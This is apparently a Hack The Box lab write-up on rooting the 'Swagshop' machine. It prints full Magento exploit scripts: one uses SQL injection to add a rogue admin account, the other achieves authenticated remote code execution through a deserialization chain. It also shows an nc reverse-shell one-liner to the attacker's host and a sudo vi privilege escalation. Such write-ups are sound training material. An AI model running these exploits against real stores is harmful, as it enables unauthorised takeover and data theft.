---
layout: post
title:  "Hack The Box - Swagshop"
date:   2019-09-29 10:00:00 +0800
categories: hackthebox magento linux vi
---
This machine was not my first Linux machine but I had fun rooted this machine ! :D

![](/assets/images/swagshop.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

Always remember to map a domain name to the machine's IP address to ease your rooting !

{% highlight bash %}
$ echo "10.10.10.140 swagshop.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sS swagshop.htb -p 1-65535 -T4
Nmap scan report for swagshop.htb (10.10.10.140)
Host is up (0.25s latency).
Not shown: 64605 closed ports, 928 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1312.66 seconds
{% endhighlight %}

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, lets see if we can gather any information or exploit it ?

![](/assets/images/swagshop1.png)

`Magento` ? After some searching, we found out that `Magento` is an open-source website that people can use to run their e-commerce business.

![](/assets/images/swagshop2.png)

# Exploitation (1)

Lets try to find some exploits for Magento
{% highlight bash %}
$ searchsploit magento
---------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                          |  Path
                                                                                        | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------- ----------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Sit | exploits/php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cro | exploits/php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                               | exploits/php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                          | exploits/php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                  | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                             | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                               | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                               | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                            | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | exploits/php/webapps/38651.txt
---------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
{% endhighlight %}

The one worked was `Magento eCommerce - Remote Code Execution`. Below is a slightly modified version.

{% highlight python %}
import requests
import base64
import sys

target = "http://swagshop.htb/"

username = "try"
password = "again"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` 
(`firstname`, `lastname`,`email`,`username`,`password`,`created`,
`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) 
VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) 
VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username=username, password=password)
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds {1}:{2}".format(target, username, password)
else:
    print "DID NOT WORK"
{% endhighlight %}

Before running the script, I checked whether `http://swagshop.htb/admin/Cms_Wysiwyg/directive/index/` was a valid URL. Unfortunately, it wasn't. Maybe we need to specify a base URL ?

![](/assets/images/swagshop3.png)

When browsing the website, I realised that the different page URLs were being appended to `index.php`. 

![](/assets/images/swagshop4.png)  
![](/assets/images/swagshop5.png)

To test my theory, I browsed to `http://swagshop.htb/index.php/admin` and I was greeted by the the admin panel login page.

![](/assets/images/swagshop6.png)

So if we try appending `index.php` to the `target` variable in the script
{% highlight python %}
target = "http://swagshop.htb/index.php"
{% endhighlight %}

and running the script, 
{% highlight bash %}
$ python magento.py
WORKED
Check http://swagshop.htb/index.php/admin with creds try:again
{% endhighlight %}

It worked ! Lets try to login as `try:again`.

![](/assets/images/swagshop7.png)

# Exploitation (2)

Alright! We got an administrative account which can pretty much have access to all the features on the website. Lets try to establish a foothold on the box which requires another exploit to be used. Back to our searchploit results, there was one exploit that required us to be authenticated.
{% highlight bash %}
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/37811.py
{% endhighlight %}

I've configured the script in this way:
{% highlight python %}
#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

from hashlib import md5
import sys
import re
import base64
import mechanize


def usage():
    print "Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\""
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'try'
password = 'again'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
# Setup the mechanize browser and options
br = mechanize.Browser()
#br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password

br.method = "POST"
request = br.submit()
content = request.read()

url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print e.read()
{% endhighlight %}

For the `install_date` variable, it can be found in `http://swagshop.htb/app/etc/local.xml`. Now lets test it out with a `whoami` command. For the `target` variable, which is the first argument, it is the URL of the admin login page (`http://10.10.10.140.htb/index.php/admin`).
{% highlight bash %}
$ python poc.py http://10.10.10.140/index.php/admin "whoami"
www-data
{% endhighlight %}

Great! Now lets our listener and establish a reverse shell connection!

{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
{% endhighlight %}

{% highlight bash %}
$ python poc.py http://swagshop.htb/index.php/admin "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/g"
{% endhighlight %}

As expected, we caught the reverse shell.
{% highlight bash %}
connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.140] 39904
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
{% endhighlight %}

# Enumeration

To quickly enumerate for possible privilege escalation vectors, I will using [LinEnum](https://github.com/rebootuser/LinEnum). To transfer it from my machine to this machine, I will be using `python`'s `SimpleHTTPServer` module.

On my machine:
{% highlight bash %}
$ mkdir httpserver
$ cd httpserver
$ cp ~/Downloads/LinEnum.sh .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

On the `Swagshop` machine:
{% highlight bash %}
$ wget http://10.10.14.140/LinEnum.sh
--2019-09-07 05:03:29--  http://10.10.14.140/LinEnum.sh
Connecting to 10.10.14.140:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45651 (45K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... ....      100% 82.5K=0.5s

2019-09-07 05:03:31 (82.5 KB/s) - 'LinEnum.sh' saved [45651/45651]
$ chmod 777 LinEnum.sh
$ ./LinEnum.sh
{% endhighlight %}

`LinEnum.sh` revealed that `www-data` had sudo privileges.
```
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*


[+] Possible sudo pwnage!
/usr/bin/vi
```


`www-data` is only able to execute `/usr/bin/vi` on a file in `/var/www/html/` as `root`. To read the root flag, there are actually 2 ways to go about doing this.

# root.txt (1)
`vi` actually has the ability to open a shell inside it by entering `:!bash`.
{% highlight bash %}
$ sudo /usr/bin/vi /var/www/html/a
~
:!bash
whoami
root
cat /root/root.txt
c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX

   ___ ___
 /| |/|\| |\ 
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
{% endhighlight %}

# root.txt (2)
If we create a symbolic link in `/var/www/html` that references the root flag, we will be able to trick `sudo` into thinking we are simply opening a file in `/var/www/html/` with `vi`!
{% highlight bash %}
$ ln -s /root/root.txt /var/www/html/root.txt
$ sudo vi /var/www/html/root.txt
c2b0XXXXXXXXXXXXXXXXXXXXXXXXXXXX

   ___ ___
 /| |/|\| |\ 
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
{% endhighlight %}

Rooted ! Thank you for reading and look forward for more writeups and articles !